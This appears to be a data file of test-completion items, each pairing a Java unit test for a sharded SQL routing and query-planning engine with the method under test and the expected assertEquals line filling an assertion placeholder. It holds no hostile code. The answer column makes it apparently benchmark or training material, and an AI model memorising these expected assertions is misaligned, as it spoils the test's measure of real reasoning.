"SQLException { RouteGen4Engine sel = new RouteGen4Engine(Engine.RouteOpcode.SelectIN, new VKeyspace(""ks"", true), ""select"", ""select_field"", new MySqlSelectQueryBlock()); sel.getRoutingParameters().setVindex(new BinaryHash()); sel.getRoutingParameters() .setValues(Lists.newArrayList(new EvalEngine.TupleExpr(Lists.newArrayList(EvalEngine.newLiteralInt(1L), EvalEngine.newLiteralInt(2L), EvalEngine.newLiteralInt(4L))))); Query.Field[] fields = TestResult.makeTestFields(""fromc|toc"", ""int64|varbinary""); VtResultSet vtResultSet = TestResult.makeTestResult(fields, ""1|\\x00"", ""1|\\x80"", ""2|\\x00"", ""4|\\x80""); LoggingVCursor vc = new LoggingVCursor(Lists.newArrayList(""-20"", ""20-""), Lists.newArrayList(vtResultSet, defaultSelectResult)); IExecute.ExecuteMultiShardResponse result = sel.execute(VtContext.background(), vc, new HashMap<>(), false); vc.expectLog(Lists.newArrayList( ""ResolveDestinations ks [type:INT64 value:""1"" type:INT64 value:""2"" type:INT64 value:""4""] Destinations:DestinationKeyspaceID(166b40b44aba4bd6),DestinationKeyspaceID(06e7ea22ce92708f),DestinationKeyspaceID(d2fd8867d50d2dfe)"", ""ExecuteMultiShard ks.-20: select {__vals: type:TUPLE, values:[type:INT64 value:""1"" type:INT64 value:""2"" type:INT64 value:""4""]} false false"")); Assert.""<AssertPlaceHolder>""; }
execute(IContext ctx, Vcursor vcursor, Map<String, BindVariable> bindVariableMap, boolean wantFields) throws SQLException { VtResultSet vtResultSet = this.exec(vcursor, bindVariableMap, wantFields); return new ExecuteMultiShardResponse(vtResultSet.truncate(this.truncateColumnCount)); }"	"assertEquals(printFail("" testINNonUnique is FAIL""), result.getVtRowList(), vtResultSet)"
"SQLException { RouteGen4Engine sel = new RouteGen4Engine(Engine.RouteOpcode.SelectDBA, new VKeyspace(""ks"", true), ""select"", ""select_field"", new MySqlSelectQueryBlock()); LoggingVCursor vc = new LoggingVCursor(Lists.newArrayList(""-20"", ""20-""), Lists.newArrayList(defaultSelectResult)); IExecute.ExecuteMultiShardResponse result = sel.execute(VtContext.background(), vc, new HashMap<>(), false); vc.expectLog(Lists.newArrayList(""ResolveDestinations ks [] Destinations:DestinationAnyShard()"", ""ExecuteMultiShard ks.-20: select {} false false"")); Assert.""<AssertPlaceHolder>"";  //        vc.Rewind() //        result, _ = wrapStreamExecute(sel, vc, map[string]*querypb.BindVariable{}, false) //        vc.ExpectLog(t, []string{ //       `ResolveDestinations ks [] Destinations:DestinationAnyShard()`, //       `StreamExecuteMulti dummy_select ks.-20: {} `, //        }) //        expectResult(t, ""sel.StreamExecute"", result, defaultSelectResult) }
execute(IContext ctx, Vcursor vcursor, Map<String, BindVariable> bindVariableMap, boolean wantFields) throws SQLException { VtResultSet vtResultSet = this.exec(vcursor, bindVariableMap, wantFields); return new ExecuteMultiShardResponse(vtResultSet.truncate(this.truncateColumnCount)); }"	"assertEquals(printFail("" testSelectDBA is FAIL""), result.getVtRowList(), defaultSelectResult)"
"SQLException { RouteGen4Engine sel = new RouteGen4Engine(Engine.RouteOpcode.SelectReference, new VKeyspace(""ks"", true), ""select"", ""select_field"", new MySqlSelectQueryBlock()); LoggingVCursor vc = new LoggingVCursor(Lists.newArrayList(""-20"", ""20-""), Lists.newArrayList(defaultSelectResult)); IExecute.ExecuteMultiShardResponse result = sel.execute(VtContext.background(), vc, new HashMap<>(), false); vc.expectLog(Lists.newArrayList(""ResolveDestinations ks [] Destinations:DestinationAnyShard()"", ""ExecuteMultiShard ks.-20: select {} false false"")); Assert.""<AssertPlaceHolder>"";  //        vc.Rewind() //        result, _ = wrapStreamExecute(sel, vc, map[string]*querypb.BindVariable{}, false) //        vc.ExpectLog(t, []string{ //        `ResolveDestinations ks [] Destinations:DestinationAnyShard()`, //        `StreamExecuteMulti dummy_select ks.-20: {} `, //        }) //        expectResult(t, ""sel.StreamExecute"", result, defaultSelectResult) }
execute(IContext ctx, Vcursor vcursor, Map<String, BindVariable> bindVariableMap, boolean wantFields) throws SQLException { VtResultSet vtResultSet = this.exec(vcursor, bindVariableMap, wantFields); return new ExecuteMultiShardResponse(vtResultSet.truncate(this.truncateColumnCount)); }"	"assertEquals(printFail("" testSelectReference is FAIL""), result.getVtRowList(), defaultSelectResult)"
"SQLException { RouteGen4Engine sel = new RouteGen4Engine(Engine.RouteOpcode.SelectEqual, new VKeyspace(""ks"", true), ""select"", ""select_field"", new MySqlSelectQueryBlock()); sel.getRoutingParameters().setVindex(new BinaryHash()); sel.getRoutingParameters().setValues(Lists.newArrayList(EvalEngine.newLiteralInt(1L))); LoggingVCursor vc = new LoggingVCursor(Lists.newArrayList(""-20"", ""20-""), null);  VtRowList result = sel.execute(VtContext.background(), vc, new HashMap<>(), false).getVtRowList(); List<String> wants = Lists.newArrayList(""ResolveDestinations ks [type:INT64 value:""1""] Destinations:DestinationKeyspaceID(166b40b44aba4bd6)"", ""ExecuteMultiShard ks.-20: select {} false false""); vc.expectLog(wants); Assert.""<AssertPlaceHolder>""; }
execute(IContext ctx, Vcursor vcursor, Map<String, BindVariable> bindVariableMap, boolean wantFields) throws SQLException { VtResultSet vtResultSet = this.exec(vcursor, bindVariableMap, wantFields); return new ExecuteMultiShardResponse(vtResultSet.truncate(this.truncateColumnCount)); }"	"assertEquals(printFail(""testRouteGetFields is FAIL""), new VtResultSet(), result)"
"SQLException { RouteGen4Engine sel = new RouteGen4Engine(Engine.RouteOpcode.SelectUnsharded, new VKeyspace(""ks"", false), ""select"", ""select_field"", new MySqlSelectQueryBlock()); OrderByParamsGen4 order = new OrderByParamsGen4(0, false, -1, null); sel.getOrderBy().add(order); sel.setTruncateColumnCount(1); LoggingVCursor vc = new LoggingVCursor(Lists.newArrayList(""0""), Lists.newArrayList(TestResult.makeTestResult(TestResult.makeTestFields(""id|col"", ""int64|int64""), ""1|1"", ""1|1"", ""3|1"", ""2|1"")));  VtRowList result = sel.execute(VtContext.background(), vc, new HashMap<>(), false).getVtRowList(); List<String> wants = Lists.newArrayList(""ResolveDestinations ks [] Destinations:DestinationAllShard()"", ""ExecuteMultiShard ks.0: select {} false false""); vc.expectLog(wants); VtResultSet wantResult = TestResult.makeTestResult(TestResult.makeTestFields(""id"", ""int64""), ""1"", ""1"", ""2"", ""3""); Assert.""<AssertPlaceHolder>""; }
execute(IContext ctx, Vcursor vcursor, Map<String, BindVariable> bindVariableMap, boolean wantFields) throws SQLException { VtResultSet vtResultSet = this.exec(vcursor, bindVariableMap, wantFields); return new ExecuteMultiShardResponse(vtResultSet.truncate(this.truncateColumnCount)); }"	"assertEquals(printFail(""testRouteSortTruncate""), wantResult, result)"
"SQLException { RouteGen4Engine sel = new RouteGen4Engine(Engine.RouteOpcode.SelectUnsharded, new VKeyspace(""ks"", false), ""select"", ""select_field"", new MySqlSelectQueryBlock()); sel.setTruncateColumnCount(1); LoggingVCursor vc = new LoggingVCursor(Lists.newArrayList(""0""), Lists.newArrayList(TestResult.makeTestResult(TestResult.makeTestFields(""id|col"", ""int64|int64""), ""1|1"", ""2|1"")));  VtRowList result = sel.execute(VtContext.background(), vc, new HashMap<>(), false).getVtRowList(); List<String> wants = Lists.newArrayList(""ResolveDestinations ks [] Destinations:DestinationAllShard()"", ""ExecuteMultiShard ks.0: select {} false false""); vc.expectLog(wants); VtResultSet wantResult = TestResult.makeTestResult(TestResult.makeTestFields(""id"", ""int64""), ""1"", ""2""); Assert.""<AssertPlaceHolder>""; }
execute(IContext ctx, Vcursor vcursor, Map<String, BindVariable> bindVariableMap, boolean wantFields) throws SQLException { VtResultSet vtResultSet = this.exec(vcursor, bindVariableMap, wantFields); return new ExecuteMultiShardResponse(vtResultSet.truncate(this.truncateColumnCount)); }"	"assertEquals(printFail(""testRouteSortTruncate""), wantResult, result)"
"SQLException { @AllArgsConstructor class TestCase { AggregateOpcodeG4 opcode;  AggregateOpcodeG4 origOpcode;  String expectedVal;  String expectedTyp;  } List<TestCase> testCases = new ArrayList<>(); testCases.add(new TestCase(AggregateOpcodeG4.AggregateCountDistinct, null, ""0"", ""INT64"")); testCases.add(new TestCase(AggregateOpcodeG4.AggregateCount, null, ""0"", ""INT64"")); testCases.add(new TestCase(AggregateOpcodeG4.AggregateSumDistinct, null, ""null"", ""DECIMAL"")); testCases.add(new TestCase(AggregateOpcodeG4.AggregateSum, null, ""null"", ""INT64"")); testCases.add(new TestCase(AggregateOpcodeG4.AggregateSum, AggregateOpcodeG4.AggregateCount, ""0"", ""INT64"")); testCases.add(new TestCase(AggregateOpcodeG4.AggregateMax, null, ""null"", ""INT64"")); testCases.add(new TestCase(AggregateOpcodeG4.AggregateMin, null, ""null"", ""INT64"")); for (TestCase test : testCases) { Query.Field[] field = TestResult.makeTestFields(AbstractAggregateGen4.printOpcode(test.opcode), ""int64""); VtResultSet resultSet = TestResult.makeTestResult(field); FakePrimitive fp = new FakePrimitive(Lists.newArrayList(resultSet)); AbstractAggregateGen4.AggregateParams aggr = new AbstractAggregateGen4.AggregateParams(test.opcode, 0, AbstractAggregateGen4.printOpcode(test.opcode)); aggr.setOrigOpcode(test.origOpcode); ScalarAggregateGen4Engine oa = new ScalarAggregateGen4Engine(true, Lists.newArrayList(aggr), fp); VtResultSet outResult = (VtResultSet) oa.execute(VtContext.background(), new NoopVCursor(), null, false).getVtRowList(); Query.Field[] wantField = TestResult.makeTestFields(AbstractAggregateGen4.printOpcode(test.opcode), test.expectedTyp); VtResultSet wantResult = TestResult.makeTestResult(wantField, test.expectedVal); Assert.""<AssertPlaceHolder>""; printOk(AbstractAggregateGen4.printOpcode(test.opcode) + "" test is [OK] ""); } }
execute(IContext ctx, Vcursor cursor, Map<String, BindVariable> bindVariableMap, boolean wantFields) throws SQLException { IExecute.ExecuteMultiShardResponse resultResponse = this.input.execute(ctx, cursor, bindVariableMap, wantFields); VtResultSet queryResult = getExecuteMultiShardResponse((VtResultSet) resultResponse.getVtRowList()); return new IExecute.ExecuteMultiShardResponse(queryResult.truncate(this.truncateColumnCount)); }"	"assertEquals(printFail(AbstractAggregateGen4.printOpcode(test.opcode) + "" test is FAIL""), wantResult, outResult)"
"SQLException { @AllArgsConstructor @ToString class TestCase { VitessCompare compare;  List<VtResultValue> row1;  List<VtResultValue> row2;  int output; }  List<TestCase> testCases = new ArrayList<>(); VitessCompare compare1 = new VitessCompare(0, -1, true, 0); VtResultValue r11 = new VtResultValue(BigInteger.valueOf(23), Query.Type.INT64); VtResultValue r12 = new VtResultValue(BigInteger.valueOf(34), Query.Type.INT64); TestCase testCase1 = new TestCase(compare1, Lists.newArrayList(r11), Lists.newArrayList(r12), 1); testCases.add(testCase1);  VitessCompare compare2 = new VitessCompare(0, -1, false, 0); VtResultValue r21 = new VtResultValue(BigInteger.valueOf(23), Query.Type.INT64); VtResultValue r22 = new VtResultValue(BigInteger.valueOf(23), Query.Type.INT64); TestCase testCase2 = new TestCase(compare2, Lists.newArrayList(r21), Lists.newArrayList(r22), 0); testCases.add(testCase2);  VitessCompare compare3 = new VitessCompare(0, -1, false, 0); VtResultValue r31 = new VtResultValue(BigInteger.valueOf(23), Query.Type.INT64); VtResultValue r32 = new VtResultValue(BigInteger.valueOf(12), Query.Type.INT64); TestCase testCase3 = new TestCase(compare3, Lists.newArrayList(r31), Lists.newArrayList(r32), 1); testCases.add(testCase3);  VitessCompare compare4 = new VitessCompare(1, 0, false, 0); VtResultValue r411 = new VtResultValue(BigInteger.valueOf(23), Query.Type.INT64); VtResultValue r412 = new VtResultValue(""b"", Query.Type.VARCHAR); VtResultValue r421 = new VtResultValue(BigInteger.valueOf(34), Query.Type.INT64); VtResultValue r422 = new VtResultValue(""a"", Query.Type.VARCHAR); TestCase testCase4 = new TestCase(compare4, Lists.newArrayList(r411, r412), Lists.newArrayList(r421, r422), -1); testCases.add(testCase4);  VitessCompare compare5 = new VitessCompare(1, 0, true, 0); VtResultValue r511 = new VtResultValue(BigInteger.valueOf(23), Query.Type.INT64); VtResultValue r512 = new VtResultValue(""A"", Query.Type.VARCHAR); VtResultValue r521 = new VtResultValue(BigInteger.valueOf(23), Query.Type.INT64); VtResultValue r522 = new VtResultValue(""a"", Query.Type.VARCHAR); TestCase testCase5 = new TestCase(compare5, Lists.newArrayList(r511, r512), Lists.newArrayList(r521, r522), 0); testCases.add(testCase5);  for (TestCase testCase : testCases) { int got = testCase.compare.compare(testCase.row1, testCase.row2); Assert.""<AssertPlaceHolder>""; printOk(testCase + "" test is [OK] ""); } }
compare(List<VtResultValue> r1, List<VtResultValue> r2) throws SQLException { int colIndex; if (this.starColFixedIndex > this.orderBy && this.starColFixedIndex < r1.size()) { colIndex = this.starColFixedIndex; } else { colIndex = this.orderBy; } int cmp = 0; if (this.weightString != -1) { // in case of a comparison or collation error switch to using the weight string column for ordering this.orderBy = this.weightString; this.weightString = -1; cmp = EvalEngine.nullSafeCompare(r1.get(this.orderBy), r2.get(this.orderBy)); } else { cmp = EvalEngine.nullSafeCompare(r1.get(colIndex), r2.get(colIndex)); } // change the result if descending ordering is required if (this.desc) { cmp = -cmp; } return cmp; }"	assertEquals(testCase.output, got)
"testInvalidQueries() { TestCase[] tcases = { new TestCase(""select t1.id, t1.col1 from t1 union select t2.uid from t2"", ""The used SELECT statements have a different number of columns""), new TestCase(""select t1.id from t1 union select t2.uid, t2.price from t2"", ""The used SELECT statements have a different number of columns""), new TestCase(""select t1.id from t1 union select t2.uid, t2.price from t2"", ""The used SELECT statements have a different number of columns""), new TestCase(""(select 1,2 union select 3,4) union (select 5,6 union select 7)"", ""The used SELECT statements have a different number of columns""), new TestCase(""select id from a union select 3 order by a.id"", ""Table 'a' from one of the SELECTs cannot be used in global ORDER clause""), new TestCase(""select a.id, b.id from a, b union select 1, 2 order by id"", ""Column 'id' in field list is ambiguous""), //            new TestCase(""select sql_calc_found_rows id from a union select 1 limit 109"", ""SQL_CALC_FOUND_ROWS not supported with union""), //            new TestCase(""select * from (select sql_calc_found_rows id from a) as t"", ""Incorrect usage/placement of 'SQL_CALC_FOUND_ROWS'""), //            new TestCase(""select (select sql_calc_found_rows id from a) as t"", ""Incorrect usage/placement of 'SQL_CALC_FOUND_ROWS'""), }; for (TestCase tcase : tcases) { SQLStatement parse = SQLUtils.parseSingleMysqlStatement(tcase.query); try { Analyzer.analyze((SQLSelectStatement) parse, ""dbName"", fakeSchemaInfo()); Assert.fail(""expected an error""); } catch (SQLException e) { String message = e.getMessage(); Assert.""<AssertPlaceHolder>""; printOk(""testInvalidQueries is [ok]current sql = "" + tcase.query); } } }
analyze(SQLSelectStatement statement, String currentDb, SchemaInformation si) throws SQLException { Analyzer analyzer = newAnalyzer(currentDb, si);  // Analysis for initial scope analyzer.analyze(statement);  // Creation of the semantic table return analyzer.newSemTable(statement, null); }"	assertEquals(tcase.errorMessage, message)
"testCheckIfAlreadyExists() { List<CheckIfAlreadyExistsTest> tests = Arrays.asList( new CheckIfAlreadyExistsTest(""No alias, both ColName"", new SQLSelectItem(new SQLIdentifierExpr(""id"")), getSQLSelectQuery(""select id""), 0), new CheckIfAlreadyExistsTest(""Aliased expression and ColName"", new SQLSelectItem(new SQLIdentifierExpr(""user_id"")), getSQLSelectQuery(""select user_id,id""), 0), new CheckIfAlreadyExistsTest(""Non-ColName expressions"", new SQLSelectItem(new SQLIdentifierExpr(""test"")), getSQLSelectQuery(""select test""), 0), new CheckIfAlreadyExistsTest(""No alias, multiple ColName in projection"", new SQLSelectItem(new SQLIdentifierExpr(""id"")), getSQLSelectQuery(""select foo,id""), 1), new CheckIfAlreadyExistsTest(""No matching entry"", new SQLSelectItem(new SQLIdentifierExpr(""id"")), getSQLSelectQuery(""select foo,name""), -1), new CheckIfAlreadyExistsTest(""No AliasedExpr in projection"", new SQLSelectItem(new SQLIdentifierExpr(""id"")), getSQLSelectQuery(""select user,people""), -1) ); SemTable semTable = new SemTable(); for (CheckIfAlreadyExistsTest tt : tests) { int got = HorizonPlanning.checkIfAlreadyExists(tt.getExpr(), tt.getSel(), semTable); Assert.""<AssertPlaceHolder>""; printOk(""testCheckIfAlreadyExists [OK] , case= "" + tt); } }
checkIfAlreadyExists(SQLSelectItem expr, SQLSelectQuery node, SemTable semTable) { TableSet exprDep = semTable.recursiveDeps(expr.getExpr()); // Here to find if the expr already exists in the SelectStatement, we have 3 cases // input is a Select -> In this case we want to search in the select // input is a Union -> In this case we want to search in the First Select of the Union // input is a Parenthesised Select -> In this case we want to search in the select // all these three cases are handled by the call to GetFirstSelect. boolean isExprCol = false; SQLName exprCol = null; if (expr.getExpr() instanceof SQLName) { isExprCol = true; exprCol = (SQLName) expr.getExpr(); }  if (node instanceof MySqlSelectQueryBlock) { MySqlSelectQueryBlock selectQueryBlock = (MySqlSelectQueryBlock) node;  // first pass - search for aliased expressions for (int i = 0; i < selectQueryBlock.getSelectList().size(); i++) { if (!isExprCol) { break; }  SQLSelectItem selectItem = selectQueryBlock.getSelectList().get(i); SqlParser.SelectExpr selectExpr = SqlParser.SelectExpr.type(selectItem); if (SqlParser.SelectExpr.AliasedExpr.equals(selectExpr)) { if (StringUtils.isNotEmpty(selectItem.getAlias()) && selectItem.getAlias().equals(((SQLName) expr.getExpr()).getSimpleName())) { return i; } } }  // next pass - we are searching the actual expressions and not the aliases for (int i = 0; i < selectQueryBlock.getSelectList().size(); i++) { SQLSelectItem selectItem = selectQueryBlock.getSelectList().get(i); SqlParser.SelectExpr selectExpr = SqlParser.SelectExpr.type(selectItem); if (!SqlParser.SelectExpr.AliasedExpr.equals(selectExpr)) { continue; }  boolean isSelectExprCol = false; SQLName selectExprCol = null; if (selectItem.getExpr() instanceof SQLName) { isSelectExprCol = true; selectExprCol = (SQLName) selectItem.getExpr(); }  TableSet selectExprDep = semTable.recursiveDeps(selectItem.getExpr());  // Check that the two expressions have the same dependencies if (!selectExprDep.equals(exprDep)) { continue; }  if (isSelectExprCol && isExprCol && exprCol.getSimpleName().equals(selectExprCol.getSimpleName())) { // the expressions are ColName, we compare their name return i; }  if (SQLExprUtils.equals(selectItem.getExpr(), expr.getExpr())) { // the expressions are not ColName, so we just compare the expressions return i; } } } return -1; }"	assertEquals(tt.getWant(), got)
"SQLException { class TmpCase { String input;  String output;  Map<String, String> sql;  public TmpCase(String input, String output) { this.input = input; this.output = output; }  public TmpCase(String input, String output, Map<String, String> sql) { this.input = input; this.output = output; this.sql = sql; } }  List<TmpCase> tmpCases = new ArrayList<>(); tmpCases.add(new TmpCase(""select 1 from t1 having a = 1"", ""select 1 from t1 where a = 1"")); tmpCases.add(new TmpCase(""select 1 from t1 where x = 1 and y = 2 having a = 1"", ""select 1 from t1 where x = 1 and y = 2 and a = 1"")); tmpCases.add(new TmpCase(""select 1 from t1 where x = 1 or y = 2 having a = 1"", ""select 1 from t1 where (x = 1 or y = 2) and a = 1"")); tmpCases.add(new TmpCase(""select 1 from t1 where x = 1 having a = 1 and b = 2"", ""select 1 from t1 where x = 1 and a = 1 and b = 2"")); tmpCases.add(new TmpCase(""select 1 from t1 where x = 1 having a = 1 or b = 2"", ""select 1 from t1 where x = 1 and (a = 1 or b = 2)"")); tmpCases.add(new TmpCase(""select 1 from t1 where x = 1 and y = 2 having a = 1 and b = 2"", ""select 1 from t1 where x = 1 and y = 2 and a = 1 and b = 2"")); tmpCases.add(new TmpCase(""select 1 from t1 where x = 1 or y = 2 having a = 1 and b = 2"", ""select 1 from t1 where (x = 1 or y = 2) and a = 1 and b = 2"")); tmpCases.add(new TmpCase(""select 1 from t1 where x = 1 and y = 2 having a = 1 or b = 2"", ""select 1 from t1 where x = 1 and y = 2 and (a = 1 or b = 2)"")); tmpCases.add(new TmpCase(""select 1 from t1 where x = 1 or y = 2 having a = 1 or b = 2"", ""select 1 from t1 where (x = 1 or y = 2) and (a = 1 or b = 2)"")); tmpCases.add(new TmpCase(""select 1 from t1 where x = 1 or y = 2 having a = 1 and count(*) = 1"", ""select 1 from t1 where (x = 1 or y = 2) and a = 1 having count(*) = 1"")); tmpCases.add(new TmpCase(""select count(*) k from t1 where x = 1 or y = 2 having a = 1 and k = 1"", ""select count(*) as k from t1 where (x = 1 or y = 2) and a = 1 having k = 1"")); tmpCases.add(new TmpCase(""select count(*) k from t1 having k = 10"", ""select count(*) as k from t1 having k = 10"")); tmpCases.add(new TmpCase(""select 1 from t1 group by a having a = 1 and count(*) > 1"", ""select 1 from t1 where a = 1 group by a having count(*) > 1"")); // new tmpCases.add(new TmpCase(""select count(*) as k from t1 having k = 10"", ""select count(*) as k from t1 having k = 10"")); tmpCases.add(new TmpCase(""select col1 as k from t1 group by t having k = 10"", ""select col1 as k from t1 where col1 = 10 group by t"")); tmpCases.add(new TmpCase(""select t1.col1 as k from t1 group by t having k = 10"", ""select t1.col1 as k from t1 where t1.col1 = 10 group by t"")); tmpCases.add(new TmpCase(""select t1.col1 from t1 group by t having t1.col1 = 10"", ""select t1.col1 from t1 where t1.col1 = 10 group by t"")); tmpCases.add(new TmpCase(""select distinct col1 as k from t1 group by k having k = 10"", ""select distinct col1 as k from t1 where col1 = 10 group by k"")); tmpCases.add(new TmpCase(""select distinct t1.col1 as k from t1 group by k having k = 10"", ""select distinct t1.col1 as k from t1 where t1.col1 = 10 group by k"")); tmpCases.add(new TmpCase(""select distinct t1.col1 from t1 group by k having t1.col1 = 10"", ""select distinct t1.col1 from t1 where t1.col1 = 10 group by k"")); tmpCases.add(new TmpCase(""select col1 as k,count(col2) from t1 group by t having k = 10"", ""select col1 as k, count(col2) from t1 where col1 = 10 group by t"")); tmpCases.add(new TmpCase(""select col1 as k,count(col2) as c from t1 group by t having k = 10 and c > 1"", ""select col1 as k, count(col2) as c from t1 where col1 = 10 group by t having c > 1"")); tmpCases.add( new TmpCase(""select col1 as k,count(t1.col2) as c from t1 group by t having k = 10 and c > 1"", ""select col1 as k, count(t1.col2) as c from t1 where col1 = 10 group by t having c > 1"")); tmpCases.add(new TmpCase(""select distinct col1 as k,count(t1.col2) as c from t1 group by t having k = 10 and c > 1"", ""select distinct col1 as k, count(t1.col2) as c from t1 where col1 = 10 group by t having c > 1"")); tmpCases.add( new TmpCase(""select col1 as k,count(t1.col2) as c from t1 group by t having k = 10 and c > 1"", ""select col1 as k, count(t1.col2) as c from t1 where col1 = 10 group by t having c > 1""));  for (TmpCase tmpCase : tmpCases) { Pair<SemTable, SQLSelectStatement> pair = prepTest(tmpCase.input); SQLSelectStatement sel = pair.getRight(); Rewriter.queryRewrite(pair.getLeft(), null, sel); Assert.""<AssertPlaceHolder>""; printOk(""testHavingRewrite is [OK],current sql = "" + tmpCase.input); } }
queryRewrite(SemTable semTable, Object reservedVars, SQLSelectStatement statement) throws SQLException { Rewriter rewriter = new Rewriter(semTable, reservedVars); if (statement.getSelect().getQuery() instanceof MySqlSelectQueryBlock) { rewriter.rewriteHavingClause((MySqlSelectQueryBlock) statement.getSelect().getQuery()); } }"	"assertEquals("""", tmpCase.output, SQLUtils.toMySqlString(sel, SQLUtils.NOT_FORMAT_OPTION).trim())"
"tryRewriteOrToIn() { @AllArgsConstructor class TestCase { SQLExpr orExpr;  List<SQLExpr> targetExprs;  @Override public String toString() { return ""orExpr:"" + orExpr; } } List<TestCase> testCaseList = new ArrayList<>(); testCaseList.add(new TestCase(SQLUtils.toMySqlExpr(""a = 1 or a = 2""), Lists.newArrayList(SQLUtils.toMySqlExpr(""a in (1,2)"")))); testCaseList.add(new TestCase(SQLUtils.toMySqlExpr(""a = 1 or a = 2 or a = 3""), Lists.newArrayList(SQLUtils.toMySqlExpr(""a in (1,2,3)"")))); testCaseList.add(new TestCase(SQLUtils.toMySqlExpr(""1 = a or a = 2 or a = 3""), Lists.newArrayList(SQLUtils.toMySqlExpr(""a in (1,2,3)"")))); testCaseList.add(new TestCase(SQLUtils.toMySqlExpr(""1 = a or 2 = a or a = 3""), Lists.newArrayList(SQLUtils.toMySqlExpr(""a in (1,2,3)"")))); testCaseList.add(new TestCase(SQLUtils.toMySqlExpr(""a = 1 or a in (2,3)""), Lists.newArrayList(SQLUtils.toMySqlExpr(""a in (1,2,3)"")))); testCaseList.add(new TestCase(SQLUtils.toMySqlExpr(""1 = a or a in (2,3)""), Lists.newArrayList(SQLUtils.toMySqlExpr(""a in (1,2,3)"")))); testCaseList.add(new TestCase(SQLUtils.toMySqlExpr(""a in (1,4) or a in (2,3)""), Lists.newArrayList(SQLUtils.toMySqlExpr(""a in (1,4,2,3)"")))); testCaseList.add(new TestCase(SQLUtils.toMySqlExpr(""b = 0 or a = 1 or a = 2""), Lists.newArrayList(SQLUtils.toMySqlExpr(""a in (1,2)"")))); testCaseList.add(new TestCase(SQLUtils.toMySqlExpr(""b = 0 or a = 1 or a = 2 or a = 3""), Lists.newArrayList(SQLUtils.toMySqlExpr(""a in (1,2,3)"")))); testCaseList.add(new TestCase(SQLUtils.toMySqlExpr(""b = 0 or 1 = a or a = 2 or a = 3""), Lists.newArrayList(SQLUtils.toMySqlExpr(""a in (1,2,3)"")))); testCaseList.add(new TestCase(SQLUtils.toMySqlExpr(""b = 0 or 1 = a or 2 = a or a = 3""), Lists.newArrayList(SQLUtils.toMySqlExpr(""a in (1,2,3)"")))); testCaseList.add(new TestCase(SQLUtils.toMySqlExpr(""b = 0 or a = 1 or a in (2,3)""), Lists.newArrayList(SQLUtils.toMySqlExpr(""a in (1,2,3)"")))); testCaseList.add(new TestCase(SQLUtils.toMySqlExpr(""b = 0 or 1 = a or a in (2,3)""), Lists.newArrayList(SQLUtils.toMySqlExpr(""a in (1,2,3)"")))); testCaseList.add(new TestCase(SQLUtils.toMySqlExpr(""b = 0 or a in (1,4) or a in (2,3)""), Lists.newArrayList(SQLUtils.toMySqlExpr(""a in (1,4,2,3)"")))); testCaseList.add(new TestCase(SQLUtils.toMySqlExpr(""c = 100 or c = 99 or a = 1 or a = 2""), Lists.newArrayList(SQLUtils.toMySqlExpr(""a in (1,2)""), SQLUtils.toMySqlExpr(""c in (100,99)"")))); testCaseList.add(new TestCase(SQLUtils.toMySqlExpr(""c = 100 or 99 = c or a = 1 or a = 2 or a = 3""), Lists.newArrayList(SQLUtils.toMySqlExpr(""a in (1,2,3)""), SQLUtils.toMySqlExpr(""c in (100,99)"")))); testCaseList.add(new TestCase(SQLUtils.toMySqlExpr(""c = '100' or c = '99' or 1 = a or a = 2 or a = 3""), Lists.newArrayList(SQLUtils.toMySqlExpr(""a in (1,2,3)""), SQLUtils.toMySqlExpr(""c in ('100','99')"")))); testCaseList.add(new TestCase(SQLUtils.toMySqlExpr(""c in (100,99) or 1 = a or 2 = a or a = 3""), Lists.newArrayList(SQLUtils.toMySqlExpr(""a in (1,2,3)""))));  for (TestCase testCase : testCaseList) { List<SQLExpr> sqlExprList = RoutePlanning.tryRewriteOrToIn(testCase.orExpr); Assert.""<AssertPlaceHolder>""; printOk(testCase + ""\n""); } }
tryRewriteOrToIn(SQLExpr expr) { List<SQLExpr> sqlExprs = splitOrExpression(null, expr); if (CollectionUtils.isEmpty(sqlExprs)) { return null; } Map<SQLExpr, List<SQLExpr>> map = new HashMap<>(); for (SQLExpr sqlExpr : sqlExprs) { if (sqlExpr instanceof SQLBinaryOpExpr) { SQLBinaryOpExpr binaryOpExpr = (SQLBinaryOpExpr) sqlExpr; if (binaryOpExpr.getLeft() instanceof SQLName && Objects.equals(SQLBinaryOperator.Equality, binaryOpExpr.getOperator())) { map.computeIfAbsent(binaryOpExpr.getLeft(), key -> new ArrayList<>()).add(sqlExpr); } else if (binaryOpExpr.getRight() instanceof SQLName && Objects.equals(SQLBinaryOperator.Equality, binaryOpExpr.getOperator())) { map.computeIfAbsent(binaryOpExpr.getRight(), key -> new ArrayList<>()).add(sqlExpr); } } if (sqlExpr instanceof SQLInListExpr) { SQLInListExpr inListExpr = (SQLInListExpr) sqlExpr; if (inListExpr.getExpr() instanceof SQLName) { map.computeIfAbsent(inListExpr.getExpr(), key -> new ArrayList<>()).add(sqlExpr); } } } List<SQLExpr> sqlExprList = new ArrayList<>(); for (Map.Entry<SQLExpr, List<SQLExpr>> entry : map.entrySet()) { if (entry.getValue().size() <= 1) { continue; } List<SQLExpr> tuple = new ArrayList<>(); for (SQLExpr sqlExpr : entry.getValue()) { if (sqlExpr instanceof SQLBinaryOpExpr) { SQLBinaryOpExpr binaryOpExpr = (SQLBinaryOpExpr) sqlExpr; if (binaryOpExpr.getLeft() instanceof SQLName) { tuple.add(binaryOpExpr.getRight()); } else if (binaryOpExpr.getRight() instanceof SQLName) { tuple.add(binaryOpExpr.getLeft()); } } if (sqlExpr instanceof SQLInListExpr) { SQLInListExpr inListExpr = (SQLInListExpr) sqlExpr; if (inListExpr.getExpr() instanceof SQLName) { tuple.addAll(inListExpr.getTargetList()); } } } SQLInListExpr inListExpr = new SQLInListExpr(entry.getKey()); inListExpr.setTargetList(tuple); sqlExprList.add(inListExpr); } return sqlExprList; }"	assertEquals(testCase.targetExprs, sqlExprList)
"testLargeOffset() { for (int tid = 0; tid < 1024; tid++) { TableSet ts = singleTableSet(tid); Assert.""<AssertPlaceHolder>""; } }
tableOffset() { if (this.large == null) { if (Long.bitCount(this.small) != 1) { return -1; } return Long.numberOfTrailingZeros(this.small); } return this.large.tableOffset(); }"	assertEquals(tid, ts.tableOffset())
"testLargeTablesConstituents() { final int GapSize = 32;  TableSet ts = new TableSet(); List<TableSet> expected = new ArrayList<>(); int table = 0;  for (int t = 0; t < 256; t++) { table += new Random().nextInt(GapSize) + 1; expected.add(singleTableSet(table)); ts.addTable(table); } Assert.""<AssertPlaceHolder>""; }
constituents() { List<TableSet> result = new ArrayList<>(); forEachTable(t -> result.add(TableSet.singleTableSet((Integer) t))); return result; }"	assertEquals(expected, ts.constituents())
